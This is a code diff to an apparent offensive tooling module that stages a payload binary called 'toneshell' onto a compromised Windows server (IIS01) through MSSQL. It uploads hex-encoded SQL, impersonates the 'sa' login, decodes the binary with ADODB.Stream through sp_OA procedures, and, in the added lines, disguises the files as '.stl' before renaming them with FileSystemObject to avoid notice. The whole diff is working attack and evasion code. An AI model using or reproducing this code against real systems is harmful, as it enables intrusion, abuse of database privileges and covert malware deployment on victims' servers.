@@ -29,7 +29,12 @@ class StagingMixin:
         print(f"[+] xpstage done: {out_path}")
 
     def cmd_xpstage_hex(self, shell, payload_name: str, timeout_s: int = 120):
-        """Stage binary to IIS01 via hex SQL + T-SQL ADODB.Stream decode (no .ps1)."""
+        """Stage binary to IIS01 via hex SQL + T-SQL ADODB.Stream decode (no .ps1).
+
+        Two-phase masquerade: the hex INSERT SQL lands on WS01 as .stl, and the
+        decode batch writes the binary to C:\\ProgramData as .stl before renaming
+        it to the original name via sp_OA FSO MoveFile in the same batch.
+        """
         resp = shell._post_json("/api/v1.0/mssql/stage", {
             "handler": "toneshell",
             "payload": payload_name,
@@ -37,11 +42,12 @@ class StagingMixin:
         })
         sql_file = resp["sqlFile"]
 
-        remote_sql = f"C:\\Windows\\Temp\\{sql_file}"
+        remote_sql = f"C:\\Windows\\Temp\\{os.path.splitext(sql_file)[0]}.stl"
         shell.cmd_put_wait(sql_file, remote_sql)
         shell.cmd_exec_raw(f'{self._sqlcmd_prefix()} -i {remote_sql}')
 
         out_path = f"C:\\ProgramData\\{payload_name}"
+        stl_path = f"C:\\ProgramData\\{os.path.splitext(payload_name)[0]}.stl"
         decode_tsql = (
             "EXECUTE AS LOGIN='sa';"
             "DECLARE @hex VARCHAR(MAX)='';"
@@ -55,8 +61,12 @@ class StagingMixin:
             "EXEC sp_OAMethod @obj,'Open';"
             "EXEC sp_OAMethod @obj,'Write',NULL,@bin;"
             f"EXEC sp_OAMethod @obj,'SaveToFile',NULL,"
-            f"'{self._tsql_escape(out_path)}',2;"
+            f"'{self._tsql_escape(stl_path)}',2;"
             "EXEC sp_OAMethod @obj,'Close';"
+            "EXEC sp_OADestroy @obj;"
+            "EXEC @hr=sp_OACreate 'Scripting.FileSystemObject',@obj OUT;"
+            f"EXEC sp_OAMethod @obj,'MoveFile',NULL,"
+            f"'{self._tsql_escape(stl_path)}','{self._tsql_escape(out_path)}';"
             "EXEC sp_OADestroy @obj;"
         )
         self._exec_q(shell, decode_tsql, timeout_s=timeout_s)
